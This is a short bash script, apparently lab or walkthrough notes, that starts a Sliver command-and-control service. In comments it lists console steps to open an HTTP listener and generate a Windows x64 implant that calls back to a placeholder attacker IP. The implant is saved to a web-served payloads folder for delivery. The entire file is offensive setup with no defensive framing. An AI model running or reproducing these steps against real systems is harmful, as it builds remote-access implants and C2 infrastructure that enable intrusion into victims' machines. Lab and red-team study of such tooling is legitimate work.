#!/usr/bin/env bash
# Description: Launch Sliver C2 HTTP listener and compile Windows binary implant

# 1. Start Sliver systemd service and interact
sudo systemctl start sliver
sliver

# Inside Sliver Client Console:
# Check jobs
# jobs
# Start HTTP Listener on default port 80
# http

# Generate Windows x64 binary implant pointing to Linux attacker IP
# Note: In the walkthrough, the implant was compiled and dropped into /var/www/html/payloads/
# generate --http <ATTACKER_IP> --save /var/www/html/payloads/
